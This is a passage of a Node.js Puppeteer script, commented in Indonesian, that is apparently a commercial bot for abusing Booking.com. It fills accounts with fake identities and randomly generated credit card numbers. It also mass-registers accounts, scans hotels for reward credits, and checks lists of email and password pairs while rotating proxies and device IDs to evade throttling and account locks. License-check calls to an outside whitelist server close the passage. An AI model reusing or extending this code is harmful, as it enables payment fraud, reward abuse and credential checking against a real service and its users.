                    waitUntil: 'domcontentloaded'
                };

                await page.goto('https://www.booking.com/index.html', $options)

                await page.waitForSelector('a[aria-label="Sign in"]')
                const signIn = await page.$('a[aria-label="Sign in"]');
                await signIn.click();

                await page.waitForSelector('#username')
                const mail = await page.$('#username')
                await mail.type(`${emailKu}`)

                await delay(1000)
                await page.keyboard.press('Enter')

                try {
                    await page.waitForSelector('#password', {
                        visible: true,
                        timeout: 5000
                    })
                    const pass = await page.$('#password')
                    await pass.type(password)
                } catch (err) {
                    console.log(`[!] Error Login`)
                    await browser.close()
                    continue;
                }
                await delay(1000)
                await page.keyboard.press('Enter')

                await delay(10000)
                try {
                    await page.waitForSelector('button[data-testid="header-profile"]', {
                        visible: true,
                        timeout: 30000
                    })
                    const tier = await page.evaluate(() => {
                        return document.querySelector('button[data-testid="header-profile"]').innerText;
                    })

                    let tier2 = tier.replace(/(\r\n|\n|\r)/gm, "");

                    console.log(`    Your Account Tier     : ${tier2}`)
                } catch (err) {
                    console.log(err)
                    await browser.close();
                }

                var card = generateCreditCard();
                var month = formatAsTwoDigit(generateRandomNumber());
                var year = generateRandomYear().toString();
                var cvv = generateRandomNumberCVV();

                await page.goto('https://account.booking.com/mysettings/personal')
                const getData = await fakeGenerator();
                const addressc = getData.address.street_address;
                const city = getData.address.city;
                const zip_code = getData.address.zip_code;
                const yearDob = getData.date_of_birth;
                const yearValid = yearDob.split('-')[0]
                const dayValid = yearDob.split('-')[2]
                var gender3 = getData.gender.toLowerCase();

                await delay(4000)
                const fieldGender = await page.$('button[data-ga-label="Edit section: gender"]')
                await fieldGender.click()

                if (gender3 == "male") {
                    await page.select('select[name="gender"]', gender3);
                } else if (gender3 == "female") {
                    await page.select('select[name="gender"]', gender3);
                } else {
                    var gender3 = "male"
                    await page.select('select[name="gender"]', "male");
                }

                var submitDataKu = await page.$('button[data-ga-label="Save section: gender"]')
                await submitDataKu.click()

                await delay(4000)
                const fieldName = await page.$('button[data-ga-label="Edit section: name"]')
                await fieldName.click()

                await page.waitForSelector('input[name="first"]')
                const inputName = await page.$('input[name="first"]')
                await inputName.type(first)

                await page.waitForSelector('input[name="last"]')
                const inputLast = await page.$('input[name="last"]')
                await inputLast.type(last)

                var submitData = await page.$('button[data-test-id="mysettings-btn-save"]')
                await submitData.click()

                console.log(`    Successully Add Name ${first} ${last}`)
                await delay(4000)

                await page.waitForSelector('button[data-ga-label="Edit section: nickname"]')
                const fieldNickname = await page.$('button[data-ga-label="Edit section: nickname"]')
                await fieldNickname.click()

                await page.waitForSelector('input[name="nickname"]')
                const inputNickname = await page.$('input[name="nickname"]')
                await inputNickname.type(`${first} ${last}`)

                var submitData = await page.$('button[data-test-id="mysettings-btn-save"]')
                await submitData.click()
                console.log(`    Successully Nickname ${first} ${last}`)

                await delay(4000)
                const fieldBirth = await page.$('button[data-ga-label="Edit section: dateOfBirth"]')
                await fieldBirth.click()

                await page.select('select[name="dateOfBirth__month"]', month);

                await delay(4000)
                await page.waitForSelector('input[placeholder="DD"]')
                const inputMonth = await page.$('input[placeholder="DD"]')
                await inputMonth.type(dayValid)

                await page.waitForSelector('input[placeholder="YYYY"]')
                const inputYear = await page.$('input[placeholder="YYYY"]')
                await inputYear.type(`${yearValid}`)

                var submitDataKu = await page.$('button[data-ga-label="Save section: dateOfBirth"]')
                await submitDataKu.click()

                console.log(`    Successully Input Date Of Birth`)

                await delay(4000)

                const fieldCountry = await page.$('button[data-ga-label="Edit section: nationality"]')
                await fieldCountry.click()

                await delay(4000)

                await page.select('select[name="nationality"]', 'us')

                console.log(`    Successully Select Country United States Of America`)

                var submitDataKu = await page.$('button[data-ga-label="Save section: nationality"]')
                await submitDataKu.click()

                await delay(4000)

                const fieldAddress = await page.$('button[data-ga-label="Edit section: address"]')
                await fieldAddress.click()

                await delay(4000)

                await page.select('select[name="country"]', 'us')

                await delay(4000)

                await page.waitForSelector('input[autocomplete="address-line1"]')
                const inputAddress = await page.$('input[autocomplete="address-line1"]')
                await inputAddress.type(addressc)

                await page.waitForSelector('input[name="city"]')
                const inputCity = await page.$('input[name="city"]')
                await inputCity.type(city)

                await page.waitForSelector('input[name="zip"]')
                const inputZip = await page.$('input[name="zip"]')
                await inputZip.type(zip_code)

                var submitDataKu = await page.$('button[data-test-id="mysettings-btn-save"]')
                await submitDataKu.click()

                console.log(`    Successully Input Address ${addressc} City ${city} Zip ${zip_code}`)
                await page.goto('https://account.booking.com/mysettings/payment')

                await page.waitForSelector('button[data-ga-label="Edit section: payments_cards"]', {
                    visible: true,
                    timeout: 15000
                })
                const addCard = await page.$('button[data-ga-label="Edit section: payments_cards"]')
                await addCard.click()

                await page.waitForSelector('iframe[title="Payment"]');
                const elementHandle = await page.$('iframe[title="Payment"]');
                const frames = await elementHandle.contentFrame();

                await frames.waitForSelector('input[autocomplete="cc-name"]', {
                    visible: true,
                    timeout: 15000
                })
                var cardHolderName = await frames.$('input[autocomplete="cc-name"]')
                await cardHolderName.type(`${first} ${last}`)

                var cardNumber = await frames.$('input[autocomplete="cc-number"]')
                await cardNumber.type(card)

                var monthyear = await frames.$('input[autocomplete="cc-exp"]')
                await monthyear.type(`${month}${year}`)

                await delay(3000)
                var submitData = await page.$('button[data-ga-label="Save section: payments_cards"]')
                await submitData.click()

                await delay(3000)
                console.log(`    Successuflly Input ${card}|${month}|${year}`)
                fs.readFile('account.json', 'utf8', (err, data) => {
                    if (err) {
                        console.error(err);
                        return;
                    }

                    // Parsing data JSON
                    const jsonData = JSON.parse(data);
                    if (jsonData.hasOwnProperty('SheetJS')) {

                        // Menambahkan entri baru dengan array yang berbeda
                        const newEntry = {
                            Email: emailKu,
                            Password: password,
                            First: first,
                            Last: last,
                            DOB: `${dayValid}-${month}-${yearValid}`,
                            Address: addressc,
                            City: city,
                            Zip_code: zip_code,
                            Card: `${card}|${month}|${year}|${cvv}`,
                        };
                        jsonData.SheetJS.push(newEntry);

                        // Menyimpan data JSON yang diperbarui ke file
                        fs.writeFile('account.json', JSON.stringify(jsonData, null, 2), 'utf8', (err) => {
                            if (err) {
                                console.error(err);
                                return;
                            }

                            // console.log('    Data JSON telah diperbarui dan disimpan ke file dahjadi.json.');
                        });
                    } else {
                        // console.error('Properti "SheetJS" tidak ditemukan dalam objek JSON.');

                    }
                });
                await browser.close();

            }
        } else if (pilihan == 3) {
            var inputUrl = setting.url
            var startPage = setting.startPage
            var vpnUse = setting.proxy
            var domain = setting.domain
            var password = setting.password
            var deviceId = rand(32);

            const hotelLocation = readlineSync.question("Masukan lokasi hotel : ")
            const minreward = readlineSync.question("Masukan minimal reward : ")
          
            const accomodationResult = await getAccomodationLocation(hotelLocation)
            if (accomodationResult.results.length < 1) {
              console.log(chalk.red("Lokasi Tidak ditemukan!"))
              process.exit(0)
            }
          
            const checkInDate = moment().add(3, "d").format("YYYY-MM-DD")
            const checkOutDate = moment(checkInDate).add(2, "d").format("YYYY-MM-DD")
            // console.log(checkInDate)

            // anjir: while(true) {
            //     try {
            //         var deviceid = generateRandomString(32);
            //         var value = await getCookie(deviceid);
            //         break;
            //     } catch(err){
            //         console.log(`    Change Your IP Please`)
            //         continue anjir;
            //     }
            // }

            if (fs.existsSync('bearer.txt')) {
                var accessToken = fs.readFileSync('bearer.txt', 'utf-8');
            } else {
                var randomAngka = randomNumber(1111, 9999);
                var first = random.first();
                var last = random.last();
                var first = first.toLowerCase();
                var last = last.toLowerCase();
                var email = `${first}${last}${randomAngka}@${domain}`;
                var deviceId = randAngka(32);

                var regisAccount = await regisAccountKu(email, deviceId, password);
                if (regisAccount.ok == 1) {
                    console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${email}|${password}`, chalk.yellow(`Successfully Register`))
                } else {
                    console.log(chalk.green('[') + chalk.white('!') + chalk.green(']'), `${email}|${password}`, chalk.yellow(`Failure Register`))
                    process.exit(0)
                }
            
                console.log()
                var email = "olvalucania7703@gmail.com";
                anjir: while(true) {
                    try {
                        var deviceid = generateRandomString(32);
                        var value = await getCookie(deviceid);
                        break;
                    } catch(err){
                        console.log(`    Change Your IP Please`)
                        continue anjir;
                    }
                }
                const inputMail = await fieldMail(email, deviceid);
                if (inputMail.nextStep == "STEP_ACCOUNT__LOCKED") {
                    console.log(`[!] ${email} ` +chalk.red(`Account Locked`))
                    fs.appendFileSync('accountBanned.txt', `${email}|${password}\n`)
                } else if (inputMail.nextStep == "STEP_SIGN_IN__PASSWORD") {
                    var value = inputMail.context.value;
                    const inputPassword = await fieldPassword(value, password, deviceid);
                    // console.log(inputPassword)
                    if (inputPassword.error) {
                        if (`${inputPassword.error[0].errorDetails}` == "Request throttled") {
                            console.log(`[!}] ${email} : ${inputPassword.error[0].errorDetails}`)
                            console.log(`    Change Your IP Please`)
                        } else {
                            console.log(`[!] ${email} : `  +chalk.red(`${inputPassword.error[0].errorDetails}`))
                        }
                    } else if (inputPassword.payloadAuthenticated.accessToken) {
                        var accessToken = inputPassword.payloadAuthenticated.accessToken;
                        var dpop = inputPassword.payloadAuthenticated.idToken;
                        var mobileToken = inputPassword.payloadAuthenticated.mobileToken;
                        console.log(`[!]` + chalk.green(` Successfully Login`) + `${email}|${password}`)

                        fs.appendFileSync('bearer.txt', `${accessToken}`)
                    } else {
                    }
                } else if (inputMail.nextStep == "STEP_EMAIL_MAGIC_LINK_SENT"){
                    console.log(`[!] ${email} Step Mail, Skip Account`)
                } else if (inputMail.error) {
                    if (`${inputMail.error[0].errorDetails}` == "Request throttled") {
                        console.log(`[!] ${email} : ${inputMail.error[0].errorDetails}`)
                        console.log(`    Waiting For Unbanned IP`)
                    } else {
                    console.log(`[!] ${email} : ${inputMail.error[0].errorDetails}`)
                    }
                } else {
                    // console.log(inputMail)
                }
            }

            const userprofile = await getUserProfile(accessToken)
            // console.log(userprofile)
            if (userprofile?.b_bookingpay_user_info) {
              console.log(``)
              console.log(
                `Anda login sebagai ${userprofile.b_bookingpay_user_info.email} (${
                  userprofile?.b_bookingpay_cash_balance_detailed?.length
                    ? userprofile?.b_bookingpay_cash_balance_detailed[0].balance
                        ?.b_part_with_symbol
                    : "0"
                })`
              )
              console.log(``)
            } else {
              console.log(`Login expired, silahkan login ulang`)
              fs.unlinkSync('bearer.txt');
              process.exit()
            }
          
            const firstResultGetHotel = await getHotelList(
              hotelLocation,
              parseInt(accomodationResult.results[0].dest_id),
              1,
              0,
              checkInDate,
              checkOutDate
            )
          
            // console.log(firstResultGetHotel.data.searchQueries.search)
            const resultDataListHotel =
              firstResultGetHotel.data.searchQueries.search.pagination
            console.log(`Checkin date ${checkInDate}`)
            console.log(`Checkout date ${checkOutDate}`)
            console.log(
              `Total property ditemukan di ${hotelLocation} adalah ${resultDataListHotel.nbResultsTotal}`
            )
            console.log("")
          
            const totalDataHotel = resultDataListHotel.nbResultsTotal
            const perPage = 25
            let currentPage = 1
            while ((currentPage - 1) * perPage < totalDataHotel) {
              // while (currentPage == 1) {
              const offset = (currentPage - 1) * perPage
              console.log(
                "Checking page " +
                  currentPage +
                  " of " +
                  Math.ceil(totalDataHotel / perPage)
              )
              try {
                const response = await getHotelList(
                  hotelLocation,
                  parseInt(accomodationResult.results[0].dest_id),
                  perPage,
                  offset,
                  checkInDate,
                  checkOutDate
                )
                const responseListHotel = response.data.searchQueries.search.results
                // console.log(responseListHotel)
                Promise.all(
                  responseListHotel.map(async (hotelData) => {
                    const hotelId = hotelData.basicPropertyData.id
                    const hotelName = hotelData.displayName.text
          
                    let maxRetryAttempts = 4
                    let attempts = 0
                    let success = false
          
                    do {
                      try {
                        const resultHotelDetail = await getDetailHotel(
                          hotelId,
                          checkInDate,
                          checkOutDate,
                          accessToken
                        )
          
                        if (resultHotelDetail.length > 0) {
                          // check if have reward
                          if (
                            resultHotelDetail[0].hasOwnProperty(
                              "composite_price_breakdown"
                            )
                          ) {
                            const itemsPriceBreakDown =
                              resultHotelDetail[0].composite_price_breakdown
                            if (itemsPriceBreakDown.hasOwnProperty("reward_amount")) {
                              const itemsData = itemsPriceBreakDown.items.filter(
                                (x) => x.kind === "reward_credit"
                              )
          
                              const isPoP =
                                resultHotelDetail[0].block[0].paymentterms.hasOwnProperty(
                                  "prepayment"
                                )
                                  ? JSON.stringify(
                                      resultHotelDetail[0].block[0].paymentterms
                                        .prepayment
                                    )
                                      .toString()
                                      .includes(`At the property you'll pay`)
                                  : false
                              if (isPoP) {
                                console.log(
                                  `${chalk.green(
                                    `Found! ${hotelName}`
                                  )} | Reward : ${chalk.yellow(
                                    `${itemsData[0].breakdown[0].formatted_amount}`
                                  )}`
                                )
        
                                fs.readFile('dataHotel.json', 'utf8', (err, data) => {
                                    if (err) {
                                        console.error(err);
                                        return;
                                    }
        
                                    // Parsing data JSON
                                    const jsonData = JSON.parse(data);
                                    if (jsonData.hasOwnProperty('SheetJS')) {
        
                                        // Menambahkan entri baru dengan array yang berbeda
                                        const newEntry = {
                                            NameHotel: hotelName,
                                            Room1Reward: `${itemsData[0].breakdown[0].formatted_amount}`,
                                        };
                                        jsonData.SheetJS.push(newEntry);
        
                                        // Menyimpan data JSON yang diperbarui ke file
                                        fs.writeFile('dataHotel.json', JSON.stringify(jsonData, null, 2), 'utf8', (err) => {
                                            if (err) {
                                                console.error(err);
                                                return;
                                            }
        
                                            // console.log('    Data JSON telah diperbarui dan disimpan ke file dahjadi.json.');
                                        });
                                    } else {
                                        // console.error('Properti "SheetJS" tidak ditemukan dalam objek JSON.');
        
                                    }
                                });
                              }
                            }
                          }
          
                          success = true
                        }
                      } catch (error) {
                        attempts++
                      }
                    } while (!success && attempts < maxRetryAttempts)
                  })
                )
              } catch (err) {
                console.log(err)
                console.log(`skip, terjadi kesalahan`)
              }
              //delay
              await new Promise((resolve) => setTimeout(resolve, 10000))
              // console.clear()
              currentPage++
            }
        } else if (pilihan == 4) {
            var inputUrl = setting.url
            var startPage = setting.startPage
            var vpnUse = setting.proxy
            var domain = setting.domain
            var password = setting.password
            var deviceId = rand(32);

            ancrit: while (true) {
                const kata3 = fs.readFileSync('proxy.txt', 'utf8')
                const list4 = kata3.split(/\r?\n/);
                const lineCount2 = list4.length;
                const randomLineNumber2 = Math.floor(Math.random() * lineCount2)
            
                var proxy = list4[randomLineNumber2];
                // console.log(proxy)
                const cookies = fs.readFileSync('akun.txt', 'utf8')
                const list = cookies.split(/\r?\n/);
                for (var i = 0; i < list.length; i++) {
                    var email = list[i].split('|')[0];
                    var password = list[i].split('|')[1];

                        if (vpnUse == "true") {
                            var deviceid = generateRandomString(32);
                            anjir: while(true) {
                                try {
                                    var deviceid = generateRandomString(32);
                                    var value = await getCookie(deviceid);
                                    break;
                                } catch(err){
                                    console.log(`    Change Your IP Please`)
                                    continue anjir;
                                }
                            }
                            const inputMail = await fieldMailProxy(email, deviceid);
                            if (inputMail.nextStep == "STEP_ACCOUNT__LOCKED") {
                                console.log(`[${i}/${list.length}] ${email} ` +chalk.red(`Account Locked`))
                                fs.appendFileSync('accountBanned.txt', `${email}|${password}\n`)
                            } else if (inputMail.nextStep == "STEP_ACCOUNT__DISABLED") {
                                console.log(`[${i}/${list.length}] ${email} ` +chalk.red(`Account Banned`))
                                fs.appendFileSync('accountBanned.txt', `${email}|${password}\n`)
                            } else if (inputMail.nextStep == "STEP_SIGN_IN__PASSWORD") {
                                var value = inputMail.context.value;
                                const inputPassword = await fieldPasswordProxy(value, password, deviceid);
                                if (inputPassword.error) {
                                    if (`${inputPassword.error[0].errorDetails}` == "Request throttled") {
                                        console.log(`[${i}/${list.length}] ${email} : ${inputPassword.error[0].errorDetails}`)
                                        console.log(`    Change Your IP Please`)
                                    } else {
                                        console.log(`[${i}/${list.length}] ${email} : `  +chalk.red(`${inputPassword.error[0].errorDetails}`))
                                    }
                                } else if (inputPassword.payloadAuthenticated.accessToken) {
                                    var accessToken = inputPassword.payloadAuthenticated.accessToken;
                                    var dpop = inputPassword.payloadAuthenticated.idToken;
                                    var mobileToken = inputPassword.payloadAuthenticated.mobileToken;
                                    console.log(`[${i}/${list.length}]` + chalk.green(` Successfully Login`) + `${email}|${password}`)
                                    const profile = await profileinfoProxy(accessToken);
                                    var profileStatus = profile.features.index_benefits_carousel.data.benefits[0];
                                    var geniusLevel1 = profileStatus.title.replace('<b>', '');
                                    var geniusLevel = geniusLevel1.replace('</b>', '');
                        
                                    console.log(`    Genius level : ${geniusLevel}`)
                                    const rewardChecking = await checkRewardProxy(accessToken);
                                    var walletSummary = rewardChecking.data.walletSummary.balance;
                                    var totalWallet = rewardChecking.data.walletSummary.balance.credits.total.prettified;
                                    var pendingWallet = walletSummary.rewards.upcoming.monetary.amount.prettified;
                                    console.log(`    ` + chalk.green(`Wallet Summary`))
                                    console.log(`    Wallet Pending          : ` + chalk.green(`${pendingWallet}`))
                                    console.log(`    Wallet Total Landing    : ` + chalk.green(`${totalWallet}`))

                                    fs.appendFileSync('dataAccount.txt', `${email}|${password}|Pending Wallet : ${pendingWallet}|Landing Wallet : ${totalWallet}\n`)
                                } else {
                                }
                            } else if (inputMail.nextStep == "STEP_EMAIL_MAGIC_LINK_SENT"){
                                console.log(`[${i}/${list.length}] ${email} Step Mail, Skip Account`)
                            } else {
                            }
                        } else {
                            anjir: while(true) {
                                try {
                                    var deviceid = generateRandomString(32);
                                    var value = await getCookie(deviceid);
                                    break;
                                } catch(err){
                                    console.log(`    Change Your IP Please`)
                                    continue anjir;
                                }
                            }
                            const inputMail = await fieldMail(email, deviceid);
                            if (inputMail.nextStep == "STEP_ACCOUNT__LOCKED") {
                                console.log(`[${i}/${list.length}] ${email} ` +chalk.red(`Account Locked`))
                                fs.appendFileSync('accountlocked.txt', `${email}|${password}\n`)
                            } else if (inputMail.nextStep == "STEP_ACCOUNT__DISABLED") {
                                    console.log(`[${i}/${list.length}] ${email} ` +chalk.red(`Account Banned`))
                                    fs.appendFileSync('accountBanned.txt', `${email}|${password}\n`)
                            } else if (inputMail.nextStep == "STEP_SIGN_IN__PASSWORD") {
                                var value = inputMail.context.value;
                                const inputPassword = await fieldPassword(value, password, deviceid);
                                if (inputPassword.error) {
                                    if (`${inputPassword.error[0].errorDetails}` == "Request throttled") {
                                        console.log(`[${i}/${list.length}] ${email} : ${inputPassword.error[0].errorDetails}`)
                                        console.log(`    Change Your IP Please`)
                                    } else {
                                        console.log(`[${i}/${list.length}] ${email} : `  +chalk.red(`${inputPassword.error[0].errorDetails}`))
                                    }
                                } else if (inputPassword.payloadAuthenticated.accessToken) {
                                    var accessToken = inputPassword.payloadAuthenticated.accessToken;
                                    var dpop = inputPassword.payloadAuthenticated.idToken;
                                    var mobileToken = inputPassword.payloadAuthenticated.mobileToken;
                                    console.log(`[${i}/${list.length}]` + chalk.green(` Successfully Login`) + `${email}|${password}`)
                                    const profile = await profileinfo(accessToken);
                                    var profileStatus = profile.features.index_benefits_carousel.data.benefits[0];
                                    var geniusLevel1 = profileStatus.title.replace('<b>', '');
                                    var geniusLevel = geniusLevel1.replace('</b>', '');
                        
                                    console.log(`    Genius level : ${geniusLevel}`)
                                    const rewardChecking = await checkReward(accessToken);
                                    var walletSummary = rewardChecking.data.walletSummary.balance;
                                    var totalWallet = rewardChecking.data.walletSummary.balance.credits.total.prettified;
                                    var pendingWallet = walletSummary.rewards.upcoming.monetary.amount.prettified;
                                    console.log(`    ` + chalk.green(`Wallet Summary`))
                                    console.log(`    Wallet Pending          : ` + chalk.green(`${pendingWallet}`))
                                    console.log(`    Wallet Total Landing    : ` + chalk.green(`${totalWallet}`))

                                    fs.appendFileSync('dataAccount.txt', `${email}|${password}|Pending Wallet : ${pendingWallet}|Landing Wallet : ${totalWallet}\n`)
                                } else {
                                }
                            } else if (inputMail.nextStep == "STEP_EMAIL_MAGIC_LINK_SENT"){
                                console.log(`[${i}/${list.length}] ${email} Step Mail, Skip Account`)
                            } else if (inputMail.error) {
                                if (`${inputMail.error[0].errorDetails}` == "Request throttled") {
                                    console.log(`[${i}/${list.length}] ${email} : ${inputMail.error[0].errorDetails}`)
                                    console.log(`    Waiting For Unbanned IP`)
                                } else {
                                console.log(`[${i}/${list.length}] ${email} : ${inputMail.error[0].errorDetails}`)
                                }
                            } else {
                                // console.log(inputMail)
                            }
                        }
                        fs.readFile('akun.txt', 'utf8', (err, content) => {
                            if (err) {
                              console.error('Error reading file:', err);
                              return;
                            }
                          
                            // Pisahkan baris-baris dalam file
                            const lines = content.split('\n');
                            // Hapus baris pertama
                            lines.shift();
                          
                            // Gabungkan kembali baris-baris ke dalam bentuk string
                            const data = lines.join('\n');
                          
                            // Tulis kembali ke file
                            fs.writeFile('akun.txt', data, 'utf8', (err) => {
                              if (err) {
                                console.error('Error writing file:', err);
                              } else {
                                console.log('Berhasil menghapus baris pertama dari file.');
                              }
                            });
                          });
                }
            process.exit(0);
            }
        } 
    })();

function randomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function autoScroll(page) {
    await page.evaluate(async () => {
        await new Promise((resolve) => {
            var totalHeight = 0;
            var distance = 100;
            var timer = setInterval(() => {
                var scrollHeight = document.body.scrollHeight;
                window.scrollBy(0, distance);
                totalHeight += distance;

                if (totalHeight >= scrollHeight - window.innerHeight) {
                    clearInterval(timer);
                    resolve();
                }
            }, 100);
        });
    });
}

function sleep(time, callback) {
    var stop = new Date().getTime();
    while (new Date().getTime() < stop + time) {
        ;
    }
    callback();
}


function addMachine1(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId1': machine
        })
    })
}

function addMachine2(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId2': machine
        })
    })
}

function addMachine3(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId3': machine
        })
    })
}

function addMachine4(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId4': machine
        })
    })
}

function addMachine5(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId5': machine
        })
    })
}

function addMachine6(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId6': machine
        })
    })
}

function addMachine7(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId7': machine
        })
    })
}

function addMachine8(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId8': machine
        })
    })
}

function addMachine9(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId9': machine
        })
    })
}

function addMachine10(license, machine) {
    var license = fetch(`https://whitelist-bot.com/rahasiaku/editmachine.php?license=${license}`, {
        method: 'POST',
        headers: {
            'Host': 'whitelist-bot.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
            'Origin': 'https://whitelist-bot.com',
